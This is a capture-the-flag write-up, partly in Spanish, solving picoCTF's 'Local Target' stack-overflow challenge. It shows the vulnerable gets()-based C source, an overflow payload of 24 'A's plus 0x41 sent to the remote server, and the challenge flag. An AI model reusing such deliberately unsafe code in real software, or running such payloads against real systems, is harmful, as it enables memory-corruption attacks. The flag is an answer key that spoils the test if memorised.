# Local Target

# Descripción
Smash the stackCan you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using:`nc saturn.picoctf.net 63755`
# Pistas
Do anything you can to change `num`.

When you change `num`, view the value as hexadecimal.
# Solución

```bash
adalh4ck1ng-picoctf@webshell:~$ ls
README.txt  local-target  local-target.c
adalh4ck1ng-picoctf@webshell:~$ cat local-target.c 
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
adalh4ck1ng-picoctf@webshell:~$ chmod +x ./local-target
adalh4ck1ng-picoctf@webshell:~$ ./local-target 
Enter a string: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

num is 1633771879
Bye!
Segmentation fault (core dumped)

# 24 letters + 41 delimeter pattern
adalh4ck1ng-picoctf@webshell:~$ python -c "print('A'*24 + '\x41')" | ./local-target
Enter a string: 
num is 65
You win!
Cannot open file.
adalh4ck1ng-picoctf@webshell:~$ python -c "print('A'*24 + '\x41')" | nc saturn.picoctf.net 63755
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
```

# Bandera
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}